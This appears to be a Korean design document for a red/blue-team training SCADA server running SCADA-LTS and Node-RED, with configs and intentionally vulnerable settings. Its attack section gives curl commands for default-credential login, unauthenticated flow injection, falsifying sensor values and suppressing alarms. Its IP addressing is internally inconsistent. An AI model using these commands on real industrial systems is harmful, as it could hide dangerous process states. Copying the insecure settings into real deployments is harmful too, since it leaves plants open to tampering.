# 자산 설계서: #13 SCADA 서버 (SCADA-LTS + Node-RED)

| 항목 | 내용 |
|------|------|
| 자산 ID | #13 |
| IP | 192.168.92.213 |
| OS | Rocky Linux 9.x |
| 호스트명 | scada-server |
| 도메인 | scada-server.ot.local |
| 역할 | SCADA-LTS + Node-RED (OT 중앙 감시/제어) |
| 네트워크 존 | OT (192.168.92.0/24) |
| 방화벽 | OPNSense-5 |
| 훈련 단계 | STEP 3-2 |
| 작성일 | 2026-03-26 |

---

## 1. 개요

SCADA 서버는 OT 존의 핵심 자산으로, 산업 제어 시스템의 중앙 감시 및 제어 기능을 수행한다. 단일 서버에 두 가지 핵심 컴포넌트가 공존하는 이중 역할(dual-role) 구조를 채택한다.

| 구분 | 역할 |
|------|------|
| SCADA-LTS | 오픈소스 SCADA 플랫폼. 태그 관리, 알람 처리, HMI 화면 제공, 이력 데이터 저장 |
| Node-RED | PLC 시뮬레이터로부터 센서 데이터를 폴링하여 SCADA-LTS로 전달하는 데이터 브릿지 |

운영자 PC(192.168.92.247-22)는 이 서버의 웹 기반 HMI에 접속하여 공정 상태를 모니터링한다. 데이터 흐름은 단방향(PLC → Node-RED → SCADA-LTS → 운영자 HMI)으로 설계되며, 이는 실제 산업 환경의 Purdue 모델 Level 2-3 구간을 모사한다.

**훈련 목적:** 레드팀은 기본 인증 정보 및 미인증 API를 통해 SCADA 데이터를 조작하고, 블루팀은 이상 징후를 탐지하여 대응한다.

## 2. 기술 스택

| 계층 | 기술 | 버전 | 비고 |
|------|------|------|------|
| OS | Rocky Linux | 9.x | RHEL 호환, 산업 현장 표준 |
| Java Runtime | OpenJDK | 11 | SCADA-LTS 구동용 |
| WAS | Apache Tomcat | 9.0.x | SCADA-LTS WAR 배포 |
| SCADA 플랫폼 | SCADA-LTS | 2.7.x | 오픈소스 (ScadaBR 포크) |
| DB | MySQL | 8.0 | SCADA-LTS 이력/설정 저장 |
| 데이터 브릿지 | Node-RED | 3.x | Node.js 18 기반 |
| Runtime | Node.js | 18 LTS | Node-RED 구동용 |

```
포트 사용 현황:
+--------------------------------------------------+
| 포트      | 서비스        | 접근 대상             |
|-----------|---------------|-----------------------|
| TCP 8080  | SCADA-LTS Web | 운영자 PC, Ind. DMZ   |
| TCP 1880  | Node-RED      | 내부 전용 (취약점)    |
| TCP 3306  | MySQL         | localhost only        |
| TCP 22    | SSH           | 관리용                |
+--------------------------------------------------+
```

## 3. 컴포넌트 아키텍처

```
+========================= OT 존 (192.168.92.0/24) ==========================+
|                                                                              |
|  +-------------------+      +-----------------------------------------+      |
|  | PLC 시뮬레이터    |      |         SCADA 서버 (.10)                |      |
|  | (.11)             |      |                                         |      |
|  |                   |      |  +-------------+    +-----------------+ |      |
|  | [Flask API:5000]--+--HTTP-->| Node-RED    |--->| SCADA-LTS      | |      |
|  |                   | 폴링  |  | (:1880)     |    | (:8080/Tomcat) | |      |
|  | - temperature     | 5sec  |  |             |    |                 | |      |
|  | - pressure        |      |  | - API 폴링  |    | - 태그 관리     | |      |
|  | - flow_rate       |      |  | - 데이터변환 |    | - 알람 처리     | |      |
|  | - power           |      |  | - 대시보드   |    | - HMI 뷰       | |      |
|  +-------------------+      |  +-------------+    | - 이력 저장     | |      |
|                              |         |           |                 | |      |
|                              |         v           +---------+-------+ |      |
|                              |  +-------------+             |         |      |
|                              |  | MySQL DB    |<------------+         |      |
|                              |  | (:3306)     | 이력/설정             |      |
|                              |  +-------------+                       |      |
|                              +-----------------------------------------+      |
|                                          |                                    |
|                                   HTTP :8080 (HMI Web)                        |
|                                          |                                    |
|                    +---------------------+---------------------+              |
|                    |                                           |              |
|          +-------------------+                     +-------------------+      |
|          | 운영자 PC 1       |                     | 운영자 PC 2       |      |
|          | (.21)             |                     | (.22)             |      |
|          | Windows 10        |                     | Windows 11        |      |
|          | 웹 브라우저(HMI)  |                     | 웹 브라우저(HMI)  |      |
|          +-------------------+                     +-------------------+      |
|                                                                              |
+==============================================================================+
         |
    OPNSense-5 (방화벽)
         |
    Industrial DMZ (192.168.92.0/24) --- 태그 쿼리만 허용 (인바운드)
```

**데이터 흐름 상세:**

```
[1] PLC Sim (.11:5000)
     |
     | GET /api/status (매 5초)
     v
[2] Node-RED (.10:1880)
     |
     | HTTP POST /api/httpds (SCADA-LTS HTTP Receiver)
     v
[3] SCADA-LTS (.10:8080)
     |
     +---> MySQL DB (이력 저장)
     |
     +---> 알람 엔진 (임계값 비교)
     |
     +---> HMI 웹 뷰 (운영자 브라우저)
     v
[4] 운영자 PC (.21/.22)
     브라우저로 실시간 공정 상태 확인
```

## 4. SCADA-LTS 설정

### 4-1. 데이터 소스 (Data Sources)

SCADA-LTS에서 HTTP Receiver 타입의 데이터 소스를 구성한다. Node-RED가 HTTP POST로 센서 값을 전달하면 SCADA-LTS가 수신하여 태그에 기록한다.

| 데이터 소스 | 타입 | 수신 경로 | 업데이트 주기 |
|-------------|------|-----------|---------------|
| OT_PLC_SENSORS | HTTP Receiver | /api/httpds | 5초 (Node-RED 폴링 주기) |

**SCADA-LTS 데이터 소스 설정 (JSON export):**

```json
{
  "dataSources": [
    {
      "xid": "DS_OT_PLC_001",
      "name": "OT_PLC_SENSORS",
      "type": "HTTP_RECEIVER",
      "enabled": true,
      "listenerPort": 8080,
      "listenerPath": "/api/httpds",
      "updatePeriodType": "SECONDS",
      "updatePeriods": 5,
      "deviceId": "PLC_SIM_01"
    }
  ]
}
```

### 4-2. 데이터 포인트 (Data Points / Tags)

| 태그 ID | 태그 이름 | 단위 | 정상 범위 | 알람 하한 | 알람 상한 | 데이터 타입 |
|---------|-----------|------|-----------|-----------|-----------|-------------|
| DP_TEMP_01 | temperature | C | 20 - 30 | 15 | 35 | Numeric |
| DP_PRES_01 | pressure | bar | 95 - 105 | 90 | 110 | Numeric |
| DP_FLOW_01 | flow_rate | L/min | 120 - 180 | 100 | 200 | Numeric |
| DP_POWR_01 | power | V | 220 - 240 | 210 | 250 | Numeric |

**데이터 포인트 상세 설정:**

```json
{
  "dataPoints": [
    {
      "xid": "DP_TEMP_01",
      "name": "temperature",
      "dataSourceXid": "DS_OT_PLC_001",
      "enabled": true,
      "dataType": "NUMERIC",
      "unit": "C",
      "chartColour": "#FF4444",
      "plotType": "LINE",
      "loggingType": "ALL",
      "defaultCacheSize": 1000,
      "textRenderer": {
        "type": "ANALOG",
        "format": "0.00",
        "suffix": " C"
      },
      "chartRenderer": {
        "type": "TABLE",
        "limit": 50
      }
    },
    {
      "xid": "DP_PRES_01",
      "name": "pressure",
      "dataSourceXid": "DS_OT_PLC_001",
      "enabled": true,
      "dataType": "NUMERIC",
      "unit": "bar",
      "chartColour": "#4444FF",
      "plotType": "LINE",
      "loggingType": "ALL",
      "defaultCacheSize": 1000,
      "textRenderer": {
        "type": "ANALOG",
        "format": "0.0",
        "suffix": " bar"
      }
    },
    {
      "xid": "DP_FLOW_01",
      "name": "flow_rate",
      "dataSourceXid": "DS_OT_PLC_001",
      "enabled": true,
      "dataType": "NUMERIC",
      "unit": "L/min",
      "chartColour": "#44FF44",
      "plotType": "LINE",
      "loggingType": "ALL",
      "defaultCacheSize": 1000,
      "textRenderer": {
        "type": "ANALOG",
        "format": "0.0",
        "suffix": " L/min"
      }
    },
    {
      "xid": "DP_POWR_01",
      "name": "power",
      "dataSourceXid": "DS_OT_PLC_001",
      "enabled": true,
      "dataType": "NUMERIC",
      "unit": "V",
      "chartColour": "#FFAA00",
      "plotType": "LINE",
      "loggingType": "ALL",
      "defaultCacheSize": 1000,
      "textRenderer": {
        "type": "ANALOG",
        "format": "0.0",
        "suffix": " V"
      }
    }
  ]
}
```

### 4-3. 알람 설정 (Event Detectors)

각 데이터 포인트에 High/Low 알람 탐지기를 설정한다. 레드팀은 이 임계값을 조작하여 알람을 무력화할 수 있다.

```json
{
  "eventDetectors": [
    {
      "xid": "ED_TEMP_HIGH",
      "name": "온도 상한 초과",
      "dataPointXid": "DP_TEMP_01",
      "type": "HIGH_LIMIT",
      "limit": 35.0,
      "duration": 10,
      "durationType": "SECONDS",
      "alarmLevel": "CRITICAL"
    },
    {
      "xid": "ED_TEMP_LOW",
      "name": "온도 하한 미달",
      "dataPointXid": "DP_TEMP_01",
      "type": "LOW_LIMIT",
      "limit": 15.0,
      "duration": 10,
      "durationType": "SECONDS",
      "alarmLevel": "CRITICAL"
    },
    {
      "xid": "ED_PRES_HIGH",
      "name": "압력 상한 초과",
      "dataPointXid": "DP_PRES_01",
      "type": "HIGH_LIMIT",
      "limit": 110.0,
      "duration": 5,
      "durationType": "SECONDS",
      "alarmLevel": "CRITICAL"
    },
    {
      "xid": "ED_PRES_LOW",
      "name": "압력 하한 미달",
      "dataPointXid": "DP_PRES_01",
      "type": "LOW_LIMIT",
      "limit": 90.0,
      "duration": 5,
      "durationType": "SECONDS",
      "alarmLevel": "CRITICAL"
    },
    {
      "xid": "ED_FLOW_HIGH",
      "name": "유량 상한 초과",
      "dataPointXid": "DP_FLOW_01",
      "type": "HIGH_LIMIT",
      "limit": 200.0,
      "duration": 10,
      "durationType": "SECONDS",
      "alarmLevel": "URGENT"
    },
    {
      "xid": "ED_FLOW_LOW",
      "name": "유량 하한 미달",
      "dataPointXid": "DP_FLOW_01",
      "type": "LOW_LIMIT",
      "limit": 100.0,
      "duration": 10,
      "durationType": "SECONDS",
      "alarmLevel": "URGENT"
    },
    {
      "xid": "ED_POWR_HIGH",
      "name": "전압 상한 초과",
      "dataPointXid": "DP_POWR_01",
      "type": "HIGH_LIMIT",
      "limit": 250.0,
      "duration": 5,
      "durationType": "SECONDS",
      "alarmLevel": "CRITICAL"
    },
    {
      "xid": "ED_POWR_LOW",
      "name": "전압 하한 미달",
      "dataPointXid": "DP_POWR_01",
      "type": "LOW_LIMIT",
      "limit": 210.0,
      "duration": 5,
      "durationType": "SECONDS",
      "alarmLevel": "CRITICAL"
    }
  ]
}
```

### 4-4. 그래피컬 뷰 / HMI 화면 설계

운영자가 웹 브라우저로 접속하는 HMI 화면 구성이다.

**메인 HMI 화면 (공정 개요):**

```
+============================================================================+
|  [SCADA-LTS]   공정 모니터링 시스템          2026-03-26 14:30:00   [admin] |
+============================================================================+
|                                                                            |
|  +-- 공정 흐름도 -------------------------------------------------------+ |
|  |                                                                       | |
|  |    +----------+     +---------+     +----------+     +-----------+    | |
|  |    |  원료    |     |  반응기  |     |  열교환기 |     |  저장탱크  |    | |
|  |    |  탱크    |====>|         |====>|          |====>|           |    | |
|  |    |          |     |  T: 25C |     |  P: 100  |     |  F: 150   |    | |
|  |    +----------+     +---------+     +----------+     +-----------+    | |
|  |                          |                                            | |
|  |                     [전력 공급]                                        | |
|  |                     V: 230V                                           | |
|  +-----------------------------------------------------------------------+ |
|                                                                            |
|  +-- 실시간 센서 값 ---------------------------------------------------+  |
|  |                                                                      |  |
|  |  +-- 온도 ------+  +-- 압력 ------+  +-- 유량 ------+  +-- 전압 -+ |  |
|  |  |              |  |              |  |              |  |          | |  |
|  |  |   25.3 C     |  |  100.2 bar   |  |  148.5 L/m  |  | 231.0 V | |  |
|  |  |  [========]  |  |  [========]  |  |  [=======]  |  | [======] | |  |
|  |  |  정상        |  |  정상        |  |  정상        |  | 정상     | |  |
|  |  +--------------+  +--------------+  +--------------+  +----------+ |  |
|  +----------------------------------------------------------------------+  |
|                                                                            |
|  +-- 알람 현황 --------------------------------------------------------+  |
|  |  상태: 정상 (활성 알람 없음)                                         |  |
|  |                                                                      |  |
|  |  최근 알람:                                                          |  |
|  |  [2026-03-26 13:45:12] INFO  - 시스템 시작 완료                      |  |
|  |  [2026-03-26 13:44:58] INFO  - 데이터 소스 연결 성공                 |  |
|  +----------------------------------------------------------------------+  |
|                                                                            |
|  [공정 개요] [트렌드 차트] [알람 이력] [설정]                              |
+============================================================================+
```

**트렌드 차트 화면:**

```
+============================================================================+
|  [SCADA-LTS]   트렌드 차트                   2026-03-26 14:30:00   [admin] |
+============================================================================+
|                                                                            |
|  온도 트렌드 (최근 1시간)                                                  |
|  35 |                                          --- 상한 알람 (35C)         |
|     |. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .       |
|  30 |          /\                                                          |
|     |         /  \        /\                                               |
|  25 |---/\--/    \------/  \----/\--------  <- 현재값                      |
|     |  /    \      \  /      \/    \                                       |
|  20 | /      \      \/              \                                      |
|     |. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .       |
|  15 |                                          --- 하한 알람 (15C)         |
|     +--+--+--+--+--+--+--+--+--+--+--+--+--> 시간                         |
|     13:30  13:40  13:50  14:00  14:10  14:20  14:30                        |
|                                                                            |
|  압력 트렌드 (최근 1시간)                                                  |
| 110 |. . . . . . . . . . . . . . . . . . . . .--- 상한 알람 (110bar)      |
|     |                                                                      |
| 105 |      /\                                                              |
|     |     /  \                                                             |
| 100 |----/    \---------/\-----------/\--------  <- 현재값                 |
|     |                  /  \         /  \                                    |
|  95 |                 /    \-------/    \                                   |
|     |. . . . . . . . . . . . . . . . . . . . .--- 하한 알람 (90bar)       |
|  90 |                                                                      |
|     +--+--+--+--+--+--+--+--+--+--+--+--+--> 시간                         |
|                                                                            |
+============================================================================+
```

### 4-5. 사용자 계정

| 계정 | 비밀번호 | 권한 | 비고 |
|------|----------|------|------|
| admin | admin | 관리자 | 의도적 취약점: 기본 인증 정보 |
| operator1 | operator1 | 읽기 전용 | 운영자 PC 1 전용 |
| operator2 | operator2 | 읽기 전용 | 운영자 PC 2 전용 |

## 5. Node-RED 플로우 설계

### 5-1. 플로우 개요

Node-RED는 PLC 시뮬레이터와 SCADA-LTS 사이의 데이터 브릿지 역할을 수행한다. 총 4개의 주요 플로우로 구성된다.

```
+-- Node-RED 플로우 구조 --------------------------------------------------+
|                                                                           |
|  [Flow 1] PLC API 폴링                                                   |
|  +-----------+     +------------+     +-------------+     +----------+   |
|  | Inject    |---->| HTTP Req   |---->| JSON Parse  |---->| Function |   |
|  | (5sec)    |     | GET /api/  |     |             |     | (변환)   |   |
|  +-----------+     | status     |     +-------------+     +-----+----+   |
|                    +------------+                               |        |
|                                                                 v        |
|  [Flow 2] SCADA-LTS 전달                                                 |
|  +-------------+     +-----------+     +------------+                    |
|  | Function    |---->| HTTP Req  |---->| Debug      |                    |
|  | (포맷변환)  |     | POST to   |     | (로그)     |                    |
|  +-------------+     | SCADA-LTS |     +------------+                    |
|                      +-----------+                                       |
|                                                                           |
|  [Flow 3] 대시보드 위젯                                                   |
|  +-------------+     +-----------+     +------------+                    |
|  | 센서 데이터 |---->| Dashboard |---->| Gauge/     |                    |
|  | (분기)      |     | Nodes     |     | Chart      |                    |
|  +-------------+     +-----------+     +------------+                    |
|                                                                           |
|  [Flow 4] 알림 처리                                                       |
|  +-------------+     +-----------+     +------------+                    |
|  | Function    |---->| Switch    |---->| Notify     |                    |
|  | (임계값)    |     | (조건)    |     | (대시보드) |                    |
|  +-------------+     +-----------+     +------------+                    |
|                                                                           |
+--------------------------------------------------------------------------+
```

### 5-2. Node-RED 플로우 JSON (전체 Export)

```json
[
    {
        "id": "flow_plc_polling",
        "type": "tab",
        "label": "PLC Sensor Polling",
        "disabled": false,
        "info": "PLC 시뮬레이터에서 센서 데이터를 5초 간격으로 폴링"
    },
    {
        "id": "inject_5sec",
        "type": "inject",
        "z": "flow_plc_polling",
        "name": "5초 폴링",
        "props": [],
        "repeat": "5",
        "crontab": "",
        "once": true,
        "onceDelay": "3",
        "topic": "",
        "x": 130,
        "y": 100,
        "wires": [["http_get_status"]]
    },
    {
        "id": "http_get_status",
        "type": "http request",
        "z": "flow_plc_polling",
        "name": "GET PLC Status",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://192.168.92.213:5000/api/status",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": true,
        "headers": [],
        "x": 330,
        "y": 100,
        "wires": [["parse_sensor_data", "dashboard_split"]]
    },
    {
        "id": "parse_sensor_data",
        "type": "function",
        "z": "flow_plc_polling",
        "name": "센서 데이터 변환",
        "func": "// PLC 시뮬레이터 응답을 SCADA-LTS HTTP Receiver 형식으로 변환\nvar sensors = msg.payload.sensors;\nvar timestamp = msg.payload.timestamp;\n\nvar scadaPayload = {};\n\nif (sensors) {\n    // SCADA-LTS HTTP Receiver가 기대하는 형식으로 변환\n    scadaPayload = {\n        \"temperature\": sensors.temperature ? sensors.temperature.value : null,\n        \"pressure\": sensors.pressure ? sensors.pressure.value : null,\n        \"flow_rate\": sensors.flow_rate ? sensors.flow_rate.value : null,\n        \"power\": sensors.power ? sensors.power.value : null,\n        \"timestamp\": timestamp\n    };\n    \n    // 글로벌 컨텍스트에 최신값 저장 (대시보드/알림용)\n    global.set('latestSensors', scadaPayload);\n    global.set('lastUpdate', new Date().toISOString());\n}\n\nmsg.payload = scadaPayload;\nmsg.headers = {\n    \"Content-Type\": \"application/json\"\n};\n\nreturn msg;",
        "outputs": 1,
        "timeout": "",
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 570,
        "y": 80,
        "wires": [["http_post_scada", "check_thresholds"]]
    },
    {
        "id": "http_post_scada",
        "type": "http request",
        "z": "flow_plc_polling",
        "name": "POST to SCADA-LTS",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "http://192.168.92.213:8080/api/httpds",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "basic",
        "senderr": true,
        "headers": [],
        "credentials": {
            "user": "admin",
            "password": "admin"
        },
        "x": 810,
        "y": 80,
        "wires": [["debug_scada_response"]]
    },
    {
        "id": "debug_scada_response",
        "type": "debug",
        "z": "flow_plc_polling",
        "name": "SCADA 응답 로그",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": true,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "payload",
        "statusType": "auto",
        "x": 1030,
        "y": 80,
        "wires": []
    },
    {
        "id": "dashboard_split",
        "type": "function",
        "z": "flow_plc_polling",
        "name": "대시보드 분기",
        "func": "var sensors = msg.payload.sensors;\nif (!sensors) return null;\n\nvar msgs = [\n    { payload: sensors.temperature ? sensors.temperature.value : 0, topic: 'temperature' },\n    { payload: sensors.pressure ? sensors.pressure.value : 0, topic: 'pressure' },\n    { payload: sensors.flow_rate ? sensors.flow_rate.value : 0, topic: 'flow_rate' },\n    { payload: sensors.power ? sensors.power.value : 0, topic: 'power' }\n];\n\nreturn [msgs];",
        "outputs": 4,
        "timeout": "",
        "noerr": 0,
        "x": 550,
        "y": 200,
        "wires": [
            ["gauge_temp", "chart_temp"],
            ["gauge_pres", "chart_pres"],
            ["gauge_flow", "chart_flow"],
            ["gauge_power", "chart_power"]
        ]
    },
    {
        "id": "gauge_temp",
        "type": "ui_gauge",
        "z": "flow_plc_polling",
        "name": "온도 게이지",
        "group": "grp_sensors",
        "order": 1,
        "width": 3,
        "height": 3,
        "gtype": "gage",
        "title": "온도",
        "label": "C",
        "format": "{{value | number:1}}",
        "min": 0,
        "max": 50,
        "colors": ["#00b500", "#e6e600", "#ca3838"],
        "seg1": 30,
        "seg2": 35,
        "className": "",
        "x": 780,
        "y": 160,
        "wires": []
    },
    {
        "id": "chart_temp",
        "type": "ui_chart",
        "z": "flow_plc_polling",
        "name": "온도 차트",
        "group": "grp_trends",
        "order": 1,
        "width": 6,
        "height": 4,
        "label": "온도 트렌드",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "데이터 수신 대기중...",
        "dot": false,
        "ymin": "10",
        "ymax": "40",
        "removeOlder": 1,
        "removeOlderPoints": "",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": ["#ff4444"],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 780,
        "y": 200,
        "wires": [[]]
    },
    {
        "id": "gauge_pres",
        "type": "ui_gauge",
        "z": "flow_plc_polling",
        "name": "압력 게이지",
        "group": "grp_sensors",
        "order": 2,
        "width": 3,
        "height": 3,
        "gtype": "gage",
        "title": "압력",
        "label": "bar",
        "format": "{{value | number:1}}",
        "min": 80,
        "max": 120,
        "colors": ["#00b500", "#e6e600", "#ca3838"],
        "seg1": 105,
        "seg2": 110,
        "x": 780,
        "y": 240,
        "wires": []
    },
    {
        "id": "chart_pres",
        "type": "ui_chart",
        "z": "flow_plc_polling",
        "name": "압력 차트",
        "group": "grp_trends",
        "order": 2,
        "width": 6,
        "height": 4,
        "label": "압력 트렌드",
        "chartType": "line",
        "ymin": "85",
        "ymax": "115",
        "x": 780,
        "y": 280,
        "wires": [[]]
    },
    {
        "id": "gauge_flow",
        "type": "ui_gauge",
        "z": "flow_plc_polling",
        "name": "유량 게이지",
        "group": "grp_sensors",
        "order": 3,
        "width": 3,
        "height": 3,
        "gtype": "gage",
        "title": "유량",
        "label": "L/min",
        "format": "{{value | number:1}}",
        "min": 50,
        "max": 250,
        "colors": ["#00b500", "#e6e600", "#ca3838"],
        "seg1": 180,
        "seg2": 200,
        "x": 780,
        "y": 320,
        "wires": []
    },
    {
        "id": "chart_flow",
        "type": "ui_chart",
        "z": "flow_plc_polling",
        "name": "유량 차트",
        "group": "grp_trends",
        "order": 3,
        "width": 6,
        "height": 4,
        "label": "유량 트렌드",
        "chartType": "line",
        "ymin": "80",
        "ymax": "220",
        "x": 780,
        "y": 360,
        "wires": [[]]
    },
    {
        "id": "gauge_power",
        "type": "ui_gauge",
        "z": "flow_plc_polling",
        "name": "전압 게이지",
        "group": "grp_sensors",
        "order": 4,
        "width": 3,
        "height": 3,
        "gtype": "gage",
        "title": "전압",
        "label": "V",
        "format": "{{value | number:1}}",
        "min": 200,
        "max": 260,
        "colors": ["#00b500", "#e6e600", "#ca3838"],
        "seg1": 240,
        "seg2": 250,
        "x": 780,
        "y": 400,
        "wires": []
    },
    {
        "id": "chart_power",
        "type": "ui_chart",
        "z": "flow_plc_polling",
        "name": "전압 차트",
        "group": "grp_trends",
        "order": 4,
        "width": 6,
        "height": 4,
        "label": "전압 트렌드",
        "chartType": "line",
        "ymin": "200",
        "ymax": "260",
        "x": 780,
        "y": 440,
        "wires": [[]]
    },
    {
        "id": "check_thresholds",
        "type": "function",
        "z": "flow_plc_polling",
        "name": "임계값 검사",
        "func": "// 알람 임계값 검사\nvar data = msg.payload;\nvar alerts = [];\n\nvar thresholds = {\n    temperature: { low: 15, high: 35, unit: 'C', name: '온도' },\n    pressure:    { low: 90, high: 110, unit: 'bar', name: '압력' },\n    flow_rate:   { low: 100, high: 200, unit: 'L/min', name: '유량' },\n    power:       { low: 210, high: 250, unit: 'V', name: '전압' }\n};\n\nfor (var key in thresholds) {\n    var t = thresholds[key];\n    var val = data[key];\n    if (val !== null && val !== undefined) {\n        if (val > t.high) {\n            alerts.push({\n                level: 'CRITICAL',\n                sensor: t.name,\n                message: t.name + ' 상한 초과: ' + val.toFixed(1) + t.unit + ' (한계: ' + t.high + t.unit + ')',\n                timestamp: new Date().toISOString()\n            });\n        }\n        if (val < t.low) {\n            alerts.push({\n                level: 'CRITICAL',\n                sensor: t.name,\n                message: t.name + ' 하한 미달: ' + val.toFixed(1) + t.unit + ' (한계: ' + t.low + t.unit + ')',\n                timestamp: new Date().toISOString()\n            });\n        }\n    }\n}\n\nif (alerts.length > 0) {\n    msg.payload = alerts;\n    return msg;\n}\nreturn null;",
        "outputs": 1,
        "timeout": "",
        "noerr": 0,
        "x": 790,
        "y": 480,
        "wires": [["alert_notification"]]
    },
    {
        "id": "alert_notification",
        "type": "ui_toast",
        "z": "flow_plc_polling",
        "name": "알람 알림",
        "position": "top right",
        "displayTime": "10",
        "highlight": "",
        "sendall": true,
        "outputs": 0,
        "ok": "확인",
        "cancel": "",
        "raw": false,
        "className": "",
        "topic": "",
        "x": 1010,
        "y": 480,
        "wires": []
    },
    {
        "id": "grp_sensors",
        "type": "ui_group",
        "name": "실시간 센서",
        "tab": "tab_main",
        "order": 1,
        "disp": true,
        "width": 12,
        "collapse": false,
        "className": ""
    },
    {
        "id": "grp_trends",
        "type": "ui_group",
        "name": "트렌드 차트",
        "tab": "tab_main",
        "order": 2,
        "disp": true,
        "width": 12,
        "collapse": false,
        "className": ""
    },
    {
        "id": "tab_main",
        "type": "ui_tab",
        "name": "OT 공정 모니터링",
        "icon": "dashboard",
        "order": 1,
        "disabled": false,
        "hidden": false
    }
]
```

### 5-3. Node-RED settings.js (취약한 설정)

```javascript
// /home/nodered/.node-red/settings.js
// 의도적 취약점: 인증 비활성화 상태

module.exports = {
    uiPort: process.env.PORT || 1880,
    uiHost: "0.0.0.0",   // 모든 인터페이스에서 수신

    // 의도적 취약점: adminAuth 주석 처리 (인증 없음)
    // adminAuth: {
    //     type: "credentials",
    //     users: [{
    //         username: "admin",
    //         password: "$2b$08$...",
    //         permissions: "*"
    //     }]
    // },

    // 의도적 취약점: httpNodeAuth 미설정 (HTTP 노드 인증 없음)
    // httpNodeAuth: {user:"user",pass:"..."},

    // 의도적 취약점: httpStaticAuth 미설정
    // httpStaticAuth: {user:"user",pass:"..."},

    functionGlobalContext: {
        SCADA_URL: "http://192.168.92.213:8080",
        PLC_API: "http://192.168.92.213:5000"
    },

    logging: {
        console: {
            level: "info",
            metrics: false,
            audit: false   // 의도적: 감사 로그 비활성화
        }
    },

    exportGlobalContextKeys: false,
    editorTheme: {
        projects: {
            enabled: false
        }
    }
};
```

## 6. 의도적 취약점 (STEP 3-2)

### 취약점 목록

| ID | 취약점 | 심각도 | 공격 시나리오 |
|----|--------|--------|---------------|
| V-SCADA-01 | 기본 인증 정보 (admin/admin) | 높음 | SCADA-LTS 웹 콘솔에 관리자 로그인 |
| V-SCADA-02 | Node-RED 인증 비활성화 | 높음 | 포트 1880 접속으로 플로우 편집기 접근 |
| V-SCADA-03 | REST API 태그 값 조작 | 높음 | API를 통해 센서 표시값 직접 변경 |
| V-SCADA-04 | 알람 임계값 변경 | 높음 | 알람 범위를 확대하여 경고 발생 억제 |

### 공격 시나리오 상세

**V-SCADA-01: 기본 인증 정보**

```bash
# SCADA-LTS 웹 콘솔 로그인
curl -X POST http://192.168.92.213:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# 응답: 인증 토큰 반환
# {"token":"eyJhbGciOiJIUzI1NiIs...","user":{"admin":true}}
```

**V-SCADA-02: Node-RED 무단 접근**

```bash
# Node-RED 편집기 직접 접속 (인증 없음)
curl http://192.168.92.213:1880

# 현재 플로우 조회
curl http://192.168.92.213:1880/flows

# 플로우 배포 (악성 플로우 주입)
curl -X POST http://192.168.92.213:1880/flows \
  -H "Content-Type: application/json" \
  -H "Node-RED-Deployment-Type: full" \
  -d @malicious_flow.json
```

**V-SCADA-03: REST API 태그 값 조작**

```bash
# SCADA-LTS API로 태그 값 직접 설정
# 온도를 25도로 고정 (실제 위험 상태를 은닉)
curl -X PUT http://192.168.92.213:8080/api/point_value/set/DP_TEMP_01 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"value": 25.0, "type": "NUMERIC"}'

# 모든 센서값을 정상 범위로 고정
for tag in DP_TEMP_01 DP_PRES_01 DP_FLOW_01 DP_POWR_01; do
  curl -X PUT "http://192.168.92.213:8080/api/point_value/set/${tag}" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer <token>" \
    -d '{"value": 25.0, "type": "NUMERIC"}'
done
```

**V-SCADA-04: 알람 임계값 변경**

```bash
# 알람 상한을 극단적으로 높여서 알람이 절대 발생하지 않게 함
curl -X PUT http://192.168.92.213:8080/api/event_detector/ED_TEMP_HIGH \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"limit": 999.0}'

# 알람 하한을 극단적으로 낮춤
curl -X PUT http://192.168.92.213:8080/api/event_detector/ED_TEMP_LOW \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"limit": -999.0}'
```

## 7. 설치/구성 절차

### 7-1. 기본 시스템 설정

```bash
#!/bin/bash
# scada_server_setup.sh - SCADA 서버 기본 설정
# 대상: 192.168.92.213 (Rocky Linux 9)

set -euo pipefail

echo "=== [1/7] 호스트명 및 네트워크 설정 ==="
hostnamectl set-hostname scada-server
cat > /etc/sysconfig/network-scripts/ifcfg-ens192 << 'NETEOF'
TYPE=Ethernet
BOOTPROTO=static
NAME=ens192
DEVICE=ens192
ONBOOT=yes
IPADDR=192.168.92.213
NETMASK=255.255.255.0
GATEWAY=192.168.92.213
DNS1=192.168.92.213
NETEOF

echo "=== [2/7] 방화벽 설정 ==="
firewall-cmd --permanent --add-port=8080/tcp   # SCADA-LTS
firewall-cmd --permanent --add-port=1880/tcp   # Node-RED (의도적 개방)
firewall-cmd --permanent --add-port=22/tcp     # SSH
firewall-cmd --reload

echo "=== [3/7] Java 11 설치 ==="
dnf install -y java-11-openjdk java-11-openjdk-devel
java -version

echo "=== [4/7] MySQL 8.0 설치 ==="
dnf install -y mysql-server
systemctl enable --now mysqld

mysql -u root << 'SQLEOF'
CREATE DATABASE scadalts CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
CREATE USER 'scadalts'@'localhost' IDENTIFIED BY 'ScadaLTS_2026!';
GRANT ALL PRIVILEGES ON scadalts.* TO 'scadalts'@'localhost';
FLUSH PRIVILEGES;
SQLEOF

echo "=== [5/7] Apache Tomcat 9 설치 ==="
TOMCAT_VER="9.0.85"
cd /opt
curl -LO "https://downloads.apache.org/tomcat/tomcat-9/v${TOMCAT_VER}/bin/apache-tomcat-${TOMCAT_VER}.tar.gz"
tar xzf "apache-tomcat-${TOMCAT_VER}.tar.gz"
